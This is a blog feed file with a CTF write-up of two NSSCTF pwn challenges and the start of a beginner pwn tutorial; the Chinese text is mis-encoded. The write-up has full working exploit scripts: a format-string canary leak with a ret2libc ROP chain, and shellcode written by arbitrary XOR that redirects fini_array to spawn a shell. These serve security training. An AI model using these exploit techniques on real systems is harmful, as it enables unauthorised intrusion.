<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NSSround14wp</title>
      <link href="/NSSround14wp/"/>
      <url>/NSSround14wp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¬¡round14åªæ‰“äº†ä¸€é¢˜ï¼Œï¼ˆæ²¡æŠ¥é›¶çœŸæ˜¯å¤ªå¥½äº†ï¼‰ï¼Œèµ›ååœ¨@æ‘¸é±¼ã®çŒ« å¸ˆå‚…çš„æŒ‡ç‚¹ä¸‹åˆè§£å†³äº†ä¸€é¢˜</p><img src="/NSSround14wp/nssround14.png" alt="round14" style="zoom:50%;"><p><strong>ä¹Ÿè®¸æ˜¯ç›®å½•</strong></p><ul><li>love</li><li>xor</li></ul><span id="more"></span><h1 id="Love"><a href="#Love" class="headerlink" title="Love"></a>Love</h1><p><em><strong>PS: åšé¢˜éƒ½èƒ½çœ‹åˆ°Tokaï¼Œæˆ‘ç›´æ¥ç‹‚å–œ-ing</strong></em></p><p>ğŸ‘‰ <a href="../resources/pwn_asset/NSS_round14/love.zip" target="_block">ç‚¹å‡»ä¸‹è½½é™„ä»¶</a></p><img src="/NSSround14wp/loveMain.png" alt="loveMain" style="zoom:75%;"><p>å‘ç°mainåˆæ ¼å¼åŒ–æ¼æ´ï¼Œç¨‹åºå¼€äº†canaryä¿æŠ¤</p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯ï¼š<strong>åˆ©ç”¨printfæ”¹å†™v4ä½¿å…¶ç­‰äºv5ï¼Œå¹¶ä¸”æ³„éœ²canary</strong></p><img src="/NSSround14wp/lovevuln.png" alt="lovevuln" style="zoom:75%;"><p>ç„¶åè¿›å…¥vulnå‡½æ•°å°±æ˜¯ä¸€ä¸ªç®€å•çš„æº¢å‡º</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28037</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x4013f3</span></span><br><span class="line">r()</span><br><span class="line">payload = <span class="string">b&#x27;%520c%9$n.%15$p&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line">res = r().split(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(res[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">ru(<span class="string">b&#x27;my level\n&#x27;</span>)</span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x40125d</span>)<span class="comment"># è¿™é‡Œè®°å¾—è¿”å›åˆ°vulnï¼Œåˆ«è¿”å›åˆ°mainå•¦ï¼Œè¦ä¸ç„¶åˆè¦å†åˆ©ç”¨ä¸€éprintfäº†</span></span><br><span class="line">sl(payload)</span><br><span class="line">libc_base = get_addr() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">ru(<span class="string">b&#x27;my level\n&#x27;</span>)</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret)</span><br><span class="line">payload += p64(rdi) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">i()</span><br></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>ğŸ‘‰ <a href="../resources/pwn_asset/NSS_round14/xor.zip" target="_block">ç‚¹å‡»ä¸‹è½½é™„ä»¶</a></p><img src="/NSSround14wp/xorMain.png" alt="xorMain" style="zoom:80%;"><p>flagåœ¨bssæ®µï¼Œåˆ¤æ–­å°äºç­‰äº0è·³å‡ºå¾ªç¯ï¼ŒxorByteWithAddresså¯ä»¥ä¸ä»»æ„åœ°å€æ•°æ®å¼‚æˆ–ï¼Œæ‰€ä»¥ç»™é«˜ä½å¼‚æˆ–ä¸€ä¸ª0xFFï¼ˆå˜æˆè´Ÿæ•°ï¼‰ï¼ŒåŸºæœ¬ä¸Šç›¸å½“äºæ— é™å¾ªç¯ï¼ˆloopï¼‰äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="number">0x600bcc</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰¾ä¸€æ®µrwï¼ˆreadableï¼Œwriteableï¼‰åŒºåŸŸå†™å…¥shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code = flag + <span class="number">0x14</span> <span class="comment"># 0x600be0, éšä¾¿æ‰¾åˆ°çš„ï¼Œåªæ˜¯æŠŠä¸ªä½å‡‘ä¸ª0è€Œå·²</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc)):</span><br><span class="line">    ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(code+i)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(sc[i])[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>ç„¶åæƒ³åŠæ³•è§¦å‘shellcodeï¼Œå› ä¸ºç¨‹åºæ²¡æœ‰æ ˆæº¢å‡ºï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è®©ç¨‹åºè‡ªå·±è§¦å‘ã€‚</p><p>ç”±äºåœ¨mainç»“æŸåä¼šè·³è½¬åˆ°_final_arrayå‚¨å­˜çš„åœ°å€ï¼Œè¿™é‡ŒæŠŠå‚¨å­˜çš„åœ°å€æ”¹æˆæˆ‘ä»¬å†™å…¥çš„shellcodeåœ°å€ï¼Œç„¶åå†æŠŠflagé«˜ä½å¼‚æˆ–ä¸€ä¸ª0xffï¼ˆå˜æˆ0ï¼Œä¹Ÿå°±æ˜¯è¯´flagå˜æˆæ­£æ•°ï¼Œè·³å‡ºå¾ªç¯ï¼Œä½¿mainç»“æŸï¼‰</p><img src="/NSSround14wp/finalArray.png" alt="finalArray" style="zoom:80%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ret_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="comment"># 0x400610 to 0x600be0</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x10</span>^<span class="number">0xe0</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">1</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x06</span>^<span class="number">0x0b</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">2</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x40</span>^<span class="number">0x60</span>)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>å®Œæ•´expï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x600bcc</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code = flag + <span class="number">0x14</span> <span class="comment"># 0x600be0</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc)):</span><br><span class="line">    ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(code+i)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(sc[i])[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="comment"># 0x400610 &gt; 0x600be0</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x10</span>^<span class="number">0xe0</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">1</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x06</span>^<span class="number">0x0b</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">2</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x40</span>^<span class="number">0x60</span>)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn ã®å­¦ä¹ ä¹‹è·¯</title>
      <link href="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
      <url>/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>pwn æ˜¯å¾ˆæ¥è¿‘åº•å±‚çš„ï¼Œç»å¸¸ä¼šå’Œæ±‡ç¼–è¿™äº›ä¸œè¥¿æ‰“äº¤é“ï¼Œæ‰€ä»¥å­¦ä¹ è¿‡ç¨‹ä¸­ä¸å¯é¿å…ä¼šæ¯”è¾ƒæ¯ç‡¥ã€‚pwnæ–¹å‘ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨ç¨‹åºæ¼æ´å†™è„šæœ¬å®æ–½æ”»å‡»å–å¾—æƒé™å¹¶æ‹¿åˆ°flagï¼ˆæœ‰æ—¶å€™shä¸å¤Ÿéœ€è¦ææƒï¼‰ï¼Œpwnæ‰‹çš„ä¹è¶£ä¹Ÿå°±è¿™äº†ã€‚<del>ï¼ˆæ‹œæ‰˜~ï¼Œpwnæ‰ç³»ç»Ÿä»€ä¹ˆçš„çœŸçš„è¶…å¸…çš„ï¼ï¼‰</del></p><span id="more"></span><h1 id="ä¹Ÿè®¸éœ€è¦ncä¸€ä¸‹ï¼Ÿï¼"><a href="#ä¹Ÿè®¸éœ€è¦ncä¸€ä¸‹ï¼Ÿï¼" class="headerlink" title="ä¹Ÿè®¸éœ€è¦ncä¸€ä¸‹ï¼Ÿï¼"></a>ä¹Ÿè®¸éœ€è¦ncä¸€ä¸‹ï¼Ÿï¼</h1><p>è¦pwnè‚¯å®šè¦å…ˆè¿æ¥æœåŠ¡å™¨å˜›ã€‚ä¸€èˆ¬ç»™äº†åœ°å€å’Œç«¯å£å¯ä»¥ç›´æ¥ç”¨pwntoolsçš„remoteè¿æ¥</p><p>æ¯”å¦‚ç»™ä½ äº† <code>114.514.19.19:810</code></p><p>pwntoolsè¿œç¨‹å°±æ˜¯<code>io = remote(&#39;114.514.19.19&#39;, 810)</code>ï¼Œ</p><p>æœ¬åœ°æ‰“å°±ç”¨ <code>io = process(&#39;file_path&#39;)</code></p><p>å¦‚æœè¦åœ¨kaliä¸Šå°±æ˜¯ <code>$ nc 114.514.19.19 810</code></p><p>å½“ç„¶æœ‰æ—¶å€™å¯èƒ½æ˜¯sshï¼Œtelnetä¹‹ç±»çš„</p><p>å¯ä»¥è‡ªè¡Œä¸Šç½‘æœç´¢å¦‚ä½•è¿æ¥ã€‚</p><p>è¿™é‡Œä»¥sshä¸ºä¾‹ï¼š å‡è®¾ç”¨æˆ·æ˜¯ctf é‚£ä¹ˆå°±å¯ä»¥ç”¨<code>$ ssh ctf@114.514.19.19 -p 810</code>è¿æ¥ï¼Œç„¶åå†è¾“å…¥å¯†ç ï¼ˆæ²¡æœ‰ç»™å°±è‡ªå·±çˆ†å§ï¼Œç”šè‡³å¯èƒ½ä¸ç»™ç«¯å£2333ï¼‰</p><p>ä¸è¿‡æœ‰ç§å·æ‡’çš„æ–¹æ³•å°±æ˜¯ç›´æ¥ç”¨xshellè¿æ¥ï¼ˆdownload: <a href="https://www.xshell.com/zh/xshell/">XSHELL - NetSarang Website</a>)</p><p>å…·ä½“ç”¨æ³•è¯·è‡ªè¡Œç™¾åº¦</p><h1 id="è¿™æ˜¯ä»€ä¹ˆï¼Ÿç¼“å†²åŒºï¼Ÿï¼æº¢å‡ºä¸€ä¸‹ï¼"><a href="#è¿™æ˜¯ä»€ä¹ˆï¼Ÿç¼“å†²åŒºï¼Ÿï¼æº¢å‡ºä¸€ä¸‹ï¼" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆï¼Ÿç¼“å†²åŒºï¼Ÿï¼æº¢å‡ºä¸€ä¸‹ï¼"></a>è¿™æ˜¯ä»€ä¹ˆï¼Ÿç¼“å†²åŒºï¼Ÿï¼æº¢å‡ºä¸€ä¸‹ï¼</h1><p>ç¼“å†²åŒºæº¢å‡ºå°±æ˜¯é•¿æ•°æ®å¤åˆ¶åˆ°å°çš„ç¼“å†²åŒºé‡Œï¼Œå¤šå‡ºçš„æ•°æ®ä¼šå‘ç”Ÿæ³„éœ²ï¼Œå¯¼è‡´å…¶ä»–æ•°æ®è¢«ç ´åã€‚<strong>å¸¸è§çš„æ ˆæº¢å‡ºå’Œå †æº¢å‡ºéƒ½åŒ…å«åœ¨å†…ï¼Œåªæ˜¯å‘ç”Ÿåœ¨æ ˆä¸Šå’Œå †ä¸Šçš„åŒºåˆ«è€Œå·²ã€‚</strong></p><p>è€Œå…¶ä¸­ï¼Œæ ˆæº¢å‡ºæ˜¯æœ€å¸¸è§çš„æ¼æ´ï¼Œä¸€èˆ¬æ¥è¯´éš¾åº¦ä¹Ÿæ¯”è¾ƒå°ï¼ˆä¹Ÿå¯ä»¥å¾ˆæ¶å¿ƒï¼‰ï¼Œä½œä¸ºpwnçš„èµ·ç‚¹å½“ä¹‹æ— æ„§å§ã€‚</p><h2 id="æ ˆã®åŸºç¡€"><a href="#æ ˆã®åŸºç¡€" class="headerlink" title="æ ˆã®åŸºç¡€"></a>æ ˆã®åŸºç¡€</h2><h3 id="ä»€ä¹ˆæ˜¯æ ˆï¼Ÿï¼ˆstackï¼‰"><a href="#ä»€ä¹ˆæ˜¯æ ˆï¼Ÿï¼ˆstackï¼‰" class="headerlink" title="ä»€ä¹ˆæ˜¯æ ˆï¼Ÿï¼ˆstackï¼‰"></a>ä»€ä¹ˆæ˜¯æ ˆï¼Ÿï¼ˆstackï¼‰</h3><p>æ ˆæ˜¯ä¸€ç§<strong>å…ˆè¿›åå‡º</strong>çš„æ•°æ®ç»“æ„ï¼Œè¿™ä¹Ÿæ­£å¥½æ»¡è¶³äº†è°ƒç”¨å‡½æ•°çš„æ–¹å¼ï¼Œå³ï¼šçˆ¶å‡½æ•°è°ƒç”¨å­å‡½æ•°ï¼Œçˆ¶åœ¨å‰ï¼Œå­åœ¨åï¼›è¿”å›å€¼æ—¶ï¼Œå­å‡½æ•°å…ˆè¿”å›ï¼Œçˆ¶å‡½æ•°åè¿”å›ã€‚</p><p>å¯¹æ ˆæœ‰pushï¼ˆå‹æ•°æ®å…¥æ 